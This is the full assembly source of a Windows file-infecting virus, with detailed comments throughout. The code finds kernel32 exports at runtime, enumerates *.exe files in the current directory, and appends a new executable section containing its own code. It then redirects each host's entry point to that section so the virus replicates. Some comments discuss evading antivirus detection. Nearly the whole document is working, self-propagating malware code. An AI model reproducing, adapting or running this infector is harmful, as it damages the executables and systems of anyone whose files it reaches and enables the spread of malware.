;
; (C) CPU - 20-04-2019
;
.386
warn pro
locals
.model flat, stdcall
assume fs:nothing

include windows.inc
include macros.inc
include apisafejector.inc

; The Generation 0 infector needs a data section even though the
; virus code won't reference it. Without a data section I found
; tasm/tlink will not properly setup the gen0 executable and
; crashes will ensue.
;
; TODO(@CPU): It would be nice to have a more satisfying answer
; for what tasm/tlink skips without this dummy section.
;
.data
  DB ?

; For similar not-fully-understood reasons we need an extern or
; gen0 will fault with an access violation.
;
; TODO(@cpu): Figure this out too!
extern AddAtomA:PROC

.code
start:
viral_payload:

; Before anything else, compute the delta offset. This is the secret 
; to position independence.
;
; TODO(@CPU): Use a less vanilla method of delta offset calculation. This
;             approach is what every AV on earth will be expecting.
  call @@delta
@@delta:
  pop ebp
  sub ebp, offset @@delta
; ebp is now the ~*[ holy delta offset ]*~
; we will preserve this register throughout execution.

; First we need to find kernel32.dll's base address. We can take advantage
; of the fact that the kernel calls the program entrypoint to do this. 
; Since the kernel CreateProcess function called this program's entrypoint
; the return address on the top of the stack will be somewhere in kernel32.dll
; address space and we can search from there for the start of a PE header to get
; the base kernel32.dll address.
@@findkernel32:
  ; Put the top of the stack into esi. This is the return address for the 
  ; CreateProcess function call one frame above us.
  mov esi, dword ptr [esp]
  ; We know the DLL is section aligned so clear out the lower byte of ESI
  and esi, 0FFFF0000h
@@findpe:
  ; If ESI points at the value 'MZ' we know its the base addr of kernel32.dll
  cmp word ptr (IMAGE_DOS_HEADER [esi]).Magic, IMAGE_DOS_SIGNATURE
  je @@findgetprocaddr
  ; Otherwise move back the section alignment and try again
  sub esi, PE_SECTION_ALIGNMENT
  jmp @@findpe

; Now we need to find the kernel32 GetProcAddress API function pointer.
; We can use this to bootstrap all of the other required APIs without
; hardcoding any offsets.
@@findgetprocaddr:
  ; Save the Kernel32.dll base addr
  mov [ebp + kernel32Base], esi
  mov eax, esi

  ; Advance past the end of the IMAGE_DOS_HEADER structure to the
  ; IMAGE_NT_HEADERS
  add esi, (IMAGE_DOS_HEADER [esi]).e_lfanew

  ; Copy the RVA for the first DataDirectory from the PE header. The first
  ; DataDirectory is always the Export table DataDirectory. How convenient!
  mov ebx, (IMAGE_NT_HEADERS [esi]).OptionalHeader.DataDirectory.VirtualAddress
  ; The data directory virtual address is an offset so we need to add the
  ; kernel32 base address to it
  add ebx, eax

  ; Zero the index counter
  xor edx, edx
@@checkexportname:
  ; Clear anything left in esi
  xor esi, esi
  ; Put the base AddressOfNames address into esi
  mov esi, (IMAGE_EXPORT_DIRECTORY [ebx]).AddressOfNames
  ; Offset esi by the edx-th name pointer to get the RVA
  add esi, edx
  ; Adjust by kernel32.dll base
  add esi, eax
  ; Deref the pointer to the RVA for the edx-th name
  mov esi, [esi]
  ; Adjust by kernel32.dll base, and use the name address as the
  ; left side of the compare.
  add esi, eax
  ; The right side of the compare is the getProcAddrName string
  lea edi, [ebp + szGetProcAddress]
  ; Compare 16 bytes - the length of getProcAddrName and a null byte.
  mov ecx, 0Fh
  ; Save esi so if the string matches we aren't one past the match.
  push esi
    repz cmpsb
  pop esi
  ; If the compare is zero we found the AddressOfNames entry for GetProcAddress
  ; and can move on to finding the function pointer.
  jz @@findordinal
  ; Otherwise we need to move forward one AddressOfNames entry (4 bytes)
  ; and try the compare again.
  add edx, 4h
  jmp @@checkexportname

; At this point esi points to a match for getProcAddrName 
; and edx is the byte offset into AddressOfNames that matched.
;
; To map from the offset in AddressOfNames to the offset in 
; AddressOfNameOrdinals we need to do some quick math.
;
; AddressOfNames entries are DWORDs while AddressOfNameOrdinals entries 
; are WORDs so to convert the AddressOfNames offset to an 
; AddressOfNameOrdinals offset we need to divide the offset by two.
@@findordinal:
  ; A shift and rotate to the right by 1 is a cheap divide by 2.
  shr edx, 01h

  ; Get the RVA for the AddressOfNameOrdinals array
  mov esi, (IMAGE_EXPORT_DIRECTORY [ebx]).AddressOfNameOrdinals
  ; Offset by the matching byte offset
  add esi, edx
  ; Adjust by kernel32.dll base
  add esi, eax
  ; Read the 2 byte ordinal for GetProcAddress
  movzx edx, word ptr [esi]

; edx now holds the ordinal for GetProcAddress and we can use that
; as the offset to find the function pointer.
;
; To get an offset into AddressOfFunctions using the ordinal we need
; to multiply by the 4 because each AddressOfFunction entry is a DWORD.
@@findfunc:
  ; A shift and rotate to the left by 2 is a cheap multiply by 4.
  shl edx, 02h

  ; Get the RVA for the AddressOfFunctions array
  mov esi, (IMAGE_EXPORT_DIRECTORY [ebx]).AddressOfFunctions
  ; Offset by the matching byte offset
  add esi, edx
  ; Adjust by kernel32.dll base
  add esi, eax
  ; Read the function pointer RVA for GetProcAddress
  mov esi, [esi]
  ; Adjust by kernel32.dll base
  add esi, eax

  ; Woohoo. esi now finally holds the pointer to 
  ; GetProcAddress in Kernel32.dll. Now we can bootstrap our win32
  ; APIs!
  mov [ebp + GetProcAddress], esi

; With GetProcAddress in hand we can now "link" each of the REQUIRED_APIs
; This will populate the pointer variable for each function using GetProcAddress.
;
; NOTE(@cpu): Each of these LINK_API's macro invocations have a related 
;             DESC_RUNTIME_API and REQUIRED_API invocation.
@@linkapis:
  LINK_API ExitProcess
  LINK_API lstrcpy
  LINK_API FindFirstFileA
  LINK_API FindNextFileA
  LINK_API CreateFileA
  LINK_API GetFileSize
  LINK_API CreateFileMappingA
  LINK_API MapViewOfFile
  LINK_API UnmapViewOfFile
  LINK_API CloseHandle
  LINK_API GetModuleHandleA

findfirst:
  mov eax, offset infectFilter
  add eax, ebp
  mov ebx, offset findData
  add ebx, ebp

  CALL_RUNTIME_API FindFirstFileA, <eax, ebx>

  ; If we got an invalid handle from FindFirstFileA that means there were no EXEs 
  ; in the directory. Jump to error to handle this case
  cmp eax, INVALID_HANDLE_VALUE
  je error
  mov [ebp + findHandle], eax

targetfound:
  ; Otherwise we have a potential .exe target to examine
  ; Copy the name of the file from the find data to our targetFile var.
  mov eax, offset targetFile
  add eax, ebp
  mov ebx, offset findData.cFileName
  add ebx, ebp
  CALL_RUNTIME_API lstrcpy, <eax,ebx>
  cmp eax, 0h
  je error
  ; If there was no error, map the target file.
  jmp mapfile

; If we're here it means the targetFile wasn't any good. 
; Time to look at the next available .exe file using FindNextFile
findnext:
  mov eax, [ebp + findHandle]
  mov ebx, offset findData
  add ebx, ebp
  CALL_RUNTIME_API FindNextFileA, <eax,ebx>
  cmp eax, 0h
  je error
  ; If there was no error, we found a potential target. Jump back
  ; to targetFound.
  jmp targetfound

; We found a targetfile and need to map it to examine whether its a good PE file.
mapfile:
  ; Open a file handle to the targetFile. Use READ + WRITE so we can modify the
  ; file easily if it turns out to be infectable.
  ; TODO(@cpu): Ideally we would also check that the file isn't marked Read Only.
  ;             If it is read only we would need to remove that attribute first.
  mov eax, offset targetFile
  add eax, ebp
  CALL_RUNTIME_API CreateFileA, <eax,GENERIC_READ + GENERIC_WRITE, 0h, 0h, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0h
  cmp eax, INVALID_HANDLE_VALUE
  je findnext
  mov [ebp + targetFileHandle], eax

  ; Get the target file's original size
  CALL_RUNTIME_API GetFileSize, <eax, 0>
  cmp eax, INVALID_HANDLE_VALUE
  je findnext
  mov [ebp + targetFileSize], eax

  ; The target file should at least be big enough for a full IMAGE_DOS_HEADER
  cmp eax, size IMAGE_DOS_HEADER
  jle error

  ; Create a read/write file mapping for the entire targetFile
  ; TODO(@cpu): I could probably be more surgical here and only map the
  ;             area of the PE file that is manipulated on the first pass.
  mov eax, [ebp + targetFileHandle]
  CALL_RUNTIME_API CreateFileMappingA, <eax, 0h, PAGE_READWRITE, 0h, 0h, 0h>
  cmp eax, 0h
  je findnext
  mov [ebp + targetMapHandle], eax

  ; Map the entire targetFile into memory
  CALL_RUNTIME_API MapViewOfFile, <eax, FILE_MAP_WRITE, 0h, 0h, 0h>
  cmp eax, 0h
  je findnext
  mov [ebp + targetP], eax

; With the target EXE mapped into memory we can start checking it out
@@checkdosheader:
  ; Check that we have a DOS header by looking for the IMAGE_DOS_SIGNATURE
  ; (the magic MZ bytes) at the expected offset
  cmp (IMAGE_DOS_HEADER [eax]).e_magic, IMAGE_DOS_SIGNATURE
  jnz findnext

  ; Advance past the end of the IMAGE_DOS_HEADER structure to the
  ; IMAGE_NT_HEADERS
  add eax, (IMAGE_DOS_HEADER [eax]).e_lfanew

  ; Check that the offset specifed by e_lfanew isn't out of bounds for the 
  ; file size
  mov ecx, eax
  sub ecx, [ebp + targetP]
  cmp ecx, [ebp + targetFileSize]
  jge findnext

  ; Check that there is enough room for an IMAGE_NT_HEADER
  add ecx, size IMAGE_NT_HEADERS
  cmp ecx, [ebp + targetFileSize]
  jge findnext

@@checkpeheader:
  ; Check that we have a PE header by looking for the right magic
  ; bytes (PE) at the expected offset
  cmp (IMAGE_NT_HEADERS [eax]).Signature, IMAGE_NT_SIGNATURE
  jnz findnext

@@checksubsystem:
  ; We only want to infect GUI or Console apps, not device drivers, 
  ; WinCE apps, etc
  cmp (IMAGE_NT_HEADERS [eax]).OptionalHeader.Subsystem, IMAGE_SUBSYSTEM_WINDOWS_GUI
  jz @@checkmachine
  cmp (IMAGE_NT_HEADERS [eax]).OptionalHeader.Subsystem, IMAGE_SUBSYSTEM_WINDOWS_CUI
  jnz findnext

@@checkmachine:
  ; We need to verify the PE is targetting a i386 machine.
  cmp (IMAGE_NT_HEADERS [eax]).FileHeader.Machine, IMAGE_FILE_MACHINE_I386
  jnz findnext

; At this point we've decided we have found a valid i386 PE and we can
; analyze it for infection.
@@analyzepe:
  ; Copy the alignment values somewhere safe
  mov ecx, (IMAGE_NT_HEADERS [eax]).OptionalHeader.SectionAlignment
  mov [ebp + sectionAlignment], ecx
  mov ecx, (IMAGE_NT_HEADERS [eax]).OptionalHeader.FileAlignment
  mov [ebp + fileAlignment], ecx

  ; Copy down how many sections it has
  mov cx, (IMAGE_NT_HEADERS [eax]).FileHeader.NumberOfSections
  movzx ecx, cx
  ; If there are zero sections, something is fucky, move on
  cmp ecx, 0h
  je findnext
  mov [ebp + numberOfSections], ecx

  ; Move ahead to the section table
  add eax, size IMAGE_NT_HEADERS

  ; Check that the pointer is still within the file size
  mov ecx, eax
  sub ecx, [ebp + targetP]
  cmp ecx, [ebp + targetFileSize]
  jge findnext

  ; Check that the last segment specified is within the file size
  mov ecx, [ebp + numberOfSections]
  mov edx, size IMAGE_SECTION_HEADER
  imul ecx, edx
  mov ebx, eax
  add ebx, ecx
  sub ebx, [ebp + targetP]
  cmp ebx, [ebp + targetFileSize]
  jge findnext

  ; Save the location of the first section header
  mov [ebp + segHeaders], eax

  ; The last segment header should be at an offset:
  ;   sizeof IMAGE_SECTION_HEADER * numberOfSections - 1
  mov ecx, [ebp + numberOfSections]
  dec ecx
  mov edx, size IMAGE_SECTION_HEADER
  imul ecx, edx

  ; Its an RVA from targetP so offset by eax
  mov edx, eax
  add ecx, edx

  ; Store the location of the last segment header
  mov [ebp + lastSegHeader], ecx

; We don't want to reinfect a file. Check if the last segment's name is 
; equal to newSegName. If it is, move on.
@@checkforinfection:
  ; Save register state so if this check passes we can easily restore
  pusha
    ; Compare the last segment's name with the newSegName
    mov esi, ecx
    mov edi, offset newSegName
    add edi, ebp
    mov ecx, newSegNameEnd - newSegName
    repz cmpsb
    ; If it is equal, then we've already infected this file. 
    ; Find a different one
    jz findnext
  popa
 
  ; Check there is room for a new seg header. We can tell if there's no
  ; room if the end of the IMAGE_SECTION_HEADER is larger than the first section's
  ; pointer to raw data. 
  ; TODO(@CPU): The above is only true most of the time... A better idea (more work...)
  ; would be to search all of the section header's for the one with the lowest 
  ; PointerToRawData and check against it. Ignoring for now because this is super 
  ; corner-casey and I'm a bit lazy!
  mov ebx, [ebp + lastSegHeader]
  add ebx, size IMAGE_SECTION_HEADER
  mov edx, [ebp + segHeaders]
  mov edx, (IMAGE_SECTION_HEADER [edx]).PointerToRawData
  add edx, [ebp + targetP]
  cmp ebx, edx
  jge findnext  

; Create a new section header for our injected section by copying
; the target's first section header and then fixing it up.
@@addsegheader:
  mov ecx, size IMAGE_SECTION_HEADER ; Size   = 1 header worth
  mov edi, [ebp + lastSegHeader]     ; DEST   = ECX = Last header start
  add edi, ecx                       ; DEST   = Last header end
  mov esi, [ebp + segHeaders]        ; Source = First segment header 
  mov ebx, edi
@@copyheader:
  lodsb
  stosb
  dec ecx
  jnz @@copyheader

; We need to customize the header we just copied
@@fixupheader:
  ; Move back to the beginning of the new header
  sub edi, size IMAGE_SECTION_HEADER

  ; Fix the segment name by writing newSegName on top of the old name
  mov eax, offset newSegName
  add eax, ebp
  CALL_RUNTIME_API lstrcpy, <edi, eax>
  cmp eax, 0h
  je findnext

  ; Fix the VirtualSize, ensuring its a multiple of the section alignment
  mov eax, viral_payload_size
  sub eax, 1
  xor edx, edx
  div [ebp + sectionAlignment]
  add eax, 1
  mul [ebp + sectionAlignment]
  mov (IMAGE_SECTION_HEADER [edi]).VirtualSize, eax

  ; Fix the virtual address, again ensuring section alignment
  mov ecx, [ebp + lastSegHeader]
  mov eax, (IMAGE_SECTION_HEADER [ecx]).VirtualSize
  mov ecx, (IMAGE_SECTION_HEADER [ecx]).SecHdrVirtualAddress
  add eax, ecx
  sub eax, 1
  xor edx, edx
  div [ebp + sectionAlignment]
  add eax, 1
  mul [ebp + sectionAlignment]
  mov [edi].SecHdrVirtualAddress, eax

  ; Temporarily move back to the start of the PE file to fix a few things
  mov ecx, [ebp + targetP]
  add ecx, (IMAGE_DOS_HEADER [ecx]).e_lfanew

  ; While we have the virtual address pointer handy patch the entrypoint
  mov (IMAGE_NT_HEADERS [ecx]).OptionalHeader.AddressOfEntryPoint, eax

  ; and increment the number of sections
  mov eax, [ebp + numberOfSections]
  inc eax
  ; Set the number of sections to the new number
  mov (IMAGE_NT_HEADERS [ecx]).FileHeader.NumberOfSections, ax

  ; Fix the raw data size, ensuring it is a multiple of the file alignment
  mov eax, viral_payload_size
  sub eax, 1
  xor edx, edx
  div [ebp + fileAlignment]
  add eax, 1
  mul [ebp + fileAlignment]
  mov (IMAGE_SECTION_HEADER [edi]).SizeOfRawData, eax

  ; Fix the raw data pointer - this should point to the beginning of the
  ; new section, which is located right after the end of the current last
  ; section. Adding the last section's PointerToRawData (the start of the
  ; last section) to SizeOfRawData gives us this address.
  mov ebx, [ebp + lastSegHeader]
  mov eax, (IMAGE_SECTION_HEADER [ebx]).PointerToRawData
  add eax, (IMAGE_SECTION_HEADER [ebx]).SizeOfRawData
  mov (IMAGE_SECTION_HEADER [edi]).PointerToRawData, eax

  ; Save the pointer to raw data and the size of the raw data
  mov eax, (IMAGE_SECTION_HEADER [edi]).PointerToRawData
  mov [ebp + injectStart], eax
  mov eax, (IMAGE_SECTION_HEADER [edi]).SizeOfRawData
  mov [ebp + injectSize], eax

  ; Fix the section flags. Notably we want this to be both EXECUTE and WRITE
  mov ecx, IMAGE_SCN_MEM_READ + \
           IMAGE_SCN_MEM_WRITE + \
           IMAGE_SCN_MEM_EXECUTE + \
           IMAGE_SCN_CNT_CODE
  mov (IMAGE_SECTION_HEADER [edi]).SecHdrCharacteristics, ecx

; We've added a section header to the file. Time to unmap & remap with an inflated 
; size big enough to fit the new section contents.
@@cleanup:
  ; Unmap the target
  mov eax, [ebp + targetP]
  CALL_RUNTIME_API UnmapViewOfFile, <eax>
  cmp eax, 0h
  je error

  ; Close the map handle
  mov eax, [ebp + targetMapHandle]
  CALL_RUNTIME_API CloseHandle, <eax>
  cmp eax, 0h
  je error

  ; NOTE(@CPU): We don't close the target file handlehere because we can reuse it
  ; for the remap operation.

  ; Calculate the new size we should map. This is the old target size + 
  ; the size of the new section on-disk
  mov eax, [ebp + targetFileSize]
  mov ecx, [ebp + injectSize]
  add eax, ecx
  mov ebx, [ebp + targetFileHandle]

  ; Memory map the target PE file again with this new size
  CALL_RUNTIME_API CreateFileMappingA, <ebx, 0h, PAGE_READWRITE, 0h, eax, 0h>
  cmp eax, 0h
  je error
  ; Save a handle to the new memory map
  mov [ebp + targetMapHandle], eax

  ; Map a full view of the resized PE
  CALL_RUNTIME_API MapViewOfFile, <eax, FILE_MAP_WRITE, 0, 0, 0>
  cmp eax, 0h
  je error
  mov [ebp + targetP], eax

  ; zero the new segment area we'll write - this makes debugging much easier
  ; and ensures we don't put random bits of the host's memory into each new 
  ; infection.
  pusha
    mov edi, eax
    add edi, [ebp + injectStart]
    mov ecx, [ebp + injectSize]
    @@loopcopy:
      mov eax, 0h
      stosb
    loop @@loopcopy
  popa

; Time to write the new section content with our own code
@@startcopyviruscode:
  ; Destination: the start of our section in targetP
  mov edi, eax
  add edi, [ebp + injectStart]
  ; Source: the beginning of the virus code
  mov esi, offset viral_payload
  add esi, ebp
  ; Number of bytes to copy: size of the injected section
  mov ecx, [ebp + injectSize]
; Copy the virus code into place
@@copyviruscode:
  rep movsb

; All done! Clean up again closing handles/maps
@@cleanupagain:
  ; Unmap the target file
  mov eax, [ebp + targetP]
  CALL_RUNTIME_API UnmapViewOfFile, <eax>
  cmp eax, 0h
  je error

  ; Close the memory map handle
  mov eax, [ebp + targetMapHandle]
  CALL_RUNTIME_API CloseHandle, <eax>
  cmp eax, 0h
  je error

  ; Close the file handle
  mov eax, [ebp + targetFileHandle]
  CALL_RUNTIME_API CloseHandle, <eax>
  cmp eax, 0h
  je error

; Woohoo. The file is now infected with a new segment containing our virus. Nice!
@@finishedinfection:
  ; Move on to other targets
  jmp findnext

; If we're here something has gone wrong or it is gen0 and there is no more work to do
; Try to use ExitProcess to terminate gracefully.
error:
  ; Check if we've already linked ExitProcess
  mov eax, [ebp + ExitProcess]
  cmp eax, 0h
  ; If we haven't our options are limited...
  je diehard
exit:
  ; Call ExitProcess to gracefully shutdown
  CALL_RUNTIME_API ExitProcess, <0h>, eax
diehard:
  ; Otherwise just ret and hope for the best...
  ret

; We don't want a REAL data section because we want everything (code and data)
; to be in one section to make it easier to copy into a new PE EXE. We fake a
; data section by adding variables to the end of the .code section and making
; sure gen0 is modified at build-time to make .code writable. For gen > 0 the
; injected section is always writable because the virus code creates it that
; way.
_data:

; Space for a string and function pointer for each API resolved at runtime.
REQUIRED_API  GetProcAddress
REQUIRED_API  ExitProcess
REQUIRED_API  lstrcpy
REQUIRED_API  FindFirstFileA
REQUIRED_API  FindNextFileA
REQUIRED_API  CreateFileA
REQUIRED_API  GetFileSize
REQUIRED_API  CreateFileMappingA
REQUIRED_API  MapViewOfFile
REQUIRED_API  UnmapViewOfFile
REQUIRED_API  CloseHandle
REQUIRED_API  GetModuleHandleA

; Base address of kernel32.dll found at runtime
kernel32Base        DD 0

; Data used by FindFirstFile and FindNextFile
findHandle          HANDLE 0
findData            WIN32_FIND_DATA <0>
infectFilter        DB "*.exe",0

; Data used for memory mapping target files
targetFile          DB WIN32_MAX_PATHLEN dup(0)
targetFileHandle    HANDLE 0
targetFileSize      DD 0
targetMapHandle     HANDLE 0
targetP             DD 0

; Data used for important target file offsets/values
sectionAlignment    DD 0
fileAlignment       DD 0
segHeaders          DD 0
lastSegHeader       DD 0
numberOfSections    DD 0
firstSegStart       DD 0

; Data used during injection
injectStart         DD 0
injectSize          DD 0
newSegName          BYTE 2eh,69h,72h,65h,6ch,6fh,63h,0h ; '.ireloc\0'
newSegNameEnd:

; Use the `$` assembler macro for the current address at this point in the assembly
; process to calculate the virus size by subtracting the start address label.
viral_payload_size EQU $ - viral_payload

end_viral_payload:
end start
; TODO(@CPU): Is this `public` needed?
public start
end
